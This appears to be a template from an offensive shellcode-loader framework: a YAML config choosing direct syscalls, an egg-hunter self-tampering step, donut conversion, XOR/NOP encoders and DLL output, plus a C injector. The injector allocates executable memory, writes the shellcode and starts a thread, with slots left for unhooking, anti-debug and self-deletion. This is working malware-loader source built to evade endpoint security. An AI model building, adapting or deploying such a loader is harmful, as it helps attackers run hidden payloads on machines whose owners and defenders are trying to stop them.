modules:
  syscalls:
    functions:
      - NtAllocateVirtualMemory
      - NtWriteVirtualMemory
      - NtCreateThreadEx
    parameters:
      recovery:
        egg_hunter
      egg:
        "7730307477303074"
    requires:
      self_tampering
  self_tampering:
    parameters:
      - "7730307477303074"
      - "0F05C3909090CCCC"
  delay:
    seconds: 30
compiler:
  name:
    cl
  out:
    dll
  def:
    LIBRARY $1
    EXPORTS
    $2
shellcode:
  transformer:
    donut
  format:
    blob
  encoders:
    - xor
    - nop
prototypes:
  1

---- CODE

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
//####USING####

#pragma comment(lib, "ntdll")

//####DEFINE####

//####CODE####


int Inject()
{
	int length = ####SHELLCODE_LENGTH####;
    unsigned char* encoded = ####SHELLCODE####;

    /*
    int i;
    for (i = 0; i < length; i++)
    {
        if (i > 0) printf(":");
        printf("%02X", encoded[i]);
    }
    printf("\n");
    */

    //####CALL####

    unsigned char* decoded = encoded;

	unsigned long size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
	SIZE_T RegionSize = (SIZE_T)length;

	LPVOID allocation_start = nullptr;

    NTSTATUS status;
	HANDLE targetHandle = (HANDLE)((int)-1);
	if (targetHandle == 0){
	    printf("[-] Invalid Target Handle\n");
	    exit(1);
	}
    printf("[*] Allocating virtual memory\n");
	//####DELAY####
    //####UNHOOK####
    status = NtAllocateVirtualMemory(targetHandle, &allocation_start, 0, (PSIZE_T)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status < 0){
	    printf("[-] Memory allocation failed\n");
	    exit(1);
	}

    printf("[*] Writing virtual memory\n");
	status = NtWriteVirtualMemory(targetHandle, allocation_start, decoded, length, 0);
    if (status < 0){
	    printf("[-] Memory writing failed\n");
	    exit(1);
	}

	HANDLE targetThreadHandle = NULL;
    printf("[*] Creating thread\n");
	NtCreateThreadEx(&targetThreadHandle, GENERIC_EXECUTE, NULL, targetHandle, allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (targetThreadHandle == NULL){
	    printf("[-] Invalid Thread Handle\n");
	    exit(1);
	}
    printf("[+] Started Thread\n");
	Sleep(5*1000);

	return 0;
}

int main(int argc, char** argv) {

    // LoadLibrary(L"C:\\Users\\d3adc0de\\Desktop\\Shared\\PenetrationTesting\\Git Personal Projects\\inceptor\\inceptor\\libs\\private\\x64\\syscall-detect.dll");

    unsigned char egg[] = { 0x77, 0x00, 0x00, 0x74, 0x77, 0x00, 0x00, 0x74 }; // w00tw00t
	unsigned char replace[] = { 0x0f, 0x05, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC }; // syscall; nop; nop; ret; nop; int3; int3

	//####SELF_TAMPERING####
	(egg, replace);

    //####ANTIDEBUG####
    //####ARGS####
    //####SELF_DELETE####

	Inject();

    return 0;
}
